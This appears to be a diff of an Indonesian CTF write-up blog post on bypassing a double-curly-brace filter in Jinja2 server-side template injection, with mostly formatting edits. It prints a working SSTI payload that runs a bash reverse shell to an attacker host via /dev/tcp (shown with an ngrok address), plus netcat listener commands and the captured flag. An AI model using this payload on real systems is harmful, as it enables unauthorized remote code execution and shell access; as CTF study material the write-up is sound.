@@ -1,8 +1,9 @@
 ---
 layout: page
 title: "Server-Side Template Injection (SSTI) - Jinja2"
-categories: CTF
+categories: ctf
 ---
+
 <div class="post-categories">
   {% if post %}
     {% assign categories = post.categories %}
@@ -17,6 +18,7 @@ categories: CTF
 </div>
 
 Pada artikel ini, saya akan membagikan cara untuk bypass filtered input SSTI Jinja2 dengan requirements:
+
 - Memungkinkan SSTI
 - Double curly brackets atau dobel kurung kurawal \{\{ di filter
 
@@ -24,6 +26,7 @@ Jadi yang pertama kali saya lakukan, masuk ke halaman web yang memungkinkan untu
 ![](/assets/img/Screenshot 2022-10-24 233937.png)
 
 Selanjutnya gunakan payload berikut ini
+
 ```
 {% raw %}
 {% if(config.class.init.globals['os'].popen('bash -c "exec bash -i &>/dev/tcp/{ip_public}/port <&1"')) %}{% endif %}
@@ -39,11 +42,13 @@ Jika kalian menggunakan ngrok, bisa gunakan perintah ini `ngrok tcp {listening_p
 <br /> `{listening_port}` akan kita gunakan untuk mendapatkan shell yang dikirim melalui domain dan port yang didapatkan dari ngrok, jangan lupa untuk gunakan perintah `nc -tlvp {listening_port}` untuk mendapatkan shell target. <br />
 
 Berdasarkan gambar diatas, maka payload yang harus dimasukkan adalah
+
 ```
 {% raw %}
 {% if(config.class.init.globals['os'].popen('bash -c "exec bash -i &>/dev/tcp/0.tcp.ap.ngrok.io/18104 <&1"')) %}{% endif %}
 {% endraw %}
 ```
+
 ![](/assets/img/Screenshot 2022-10-25 004110.png)
 
 Dan didapatlah flagnya `BEECTF{3s_3s_t1_a1_Gg3Z_h3h3_g12l2bi30l}`
